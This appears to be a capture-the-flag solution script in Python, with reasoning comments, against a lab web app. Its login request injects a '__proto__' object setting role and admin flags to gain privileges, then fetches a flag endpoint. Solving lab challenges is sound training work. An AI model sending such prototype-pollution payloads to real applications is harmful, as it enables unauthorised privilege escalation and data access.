import requests

# What if it's checking user.username === 'admin'?
# We logged in as `admin`, but got Forbidden.
# `url = "http://exp.cybergame.sk:7021/api/v2/login"`
# `r = requests.post(url, json={"username": "admin", "password": "admin"})`
# Oh wait, is `admin`'s password actually `admin`?
# YES, in `req_admin.py` it returned:
# `{"message":"Logged in successfully","token":"...","user":{"id":8,"username":"admin"}}`
# So `admin`:`admin` IS A VALID LOGIN!

# If `admin:admin` gets Forbidden, what DOES get the flag?
# The description: "This app will hide all your secrets. Some of them are already here and aren't even hidden."
# Is the flag in `/api/v2/secretendpointforflag`? We need to bypass the Forbidden check.
# What does `secretendpointforflag` check?
# Maybe `req.user.role === 'admin'` but `admin` user doesn't have `role` in the DB?
# So if we log in as `admin` AND we pollute prototype, wait!
# If we pollute prototype, does it affect the user object from DB?
# `sqlite3` returns a clean object, but it DOES inherit from Object.prototype!
# If we pollute `isAdmin: true` globally via `__proto__` during login of `admin`?
url_login = "http://exp.cybergame.sk:7021/api/v2/login"
payload = {
    "username": "admin",
    "password": "admin",
    "__proto__": {
        "role": "admin",
        "isAdmin": True,
        "admin": True,
        "is_admin": True
    }
}
r_login = requests.post(url_login, json=payload, headers={"Content-Type": "application/json"})
token = r_login.json().get("token")

r2 = requests.get("http://exp.cybergame.sk:7021/api/v2/secretendpointforflag", headers={"Authorization": f"Bearer {token}"})
print(r2.text)
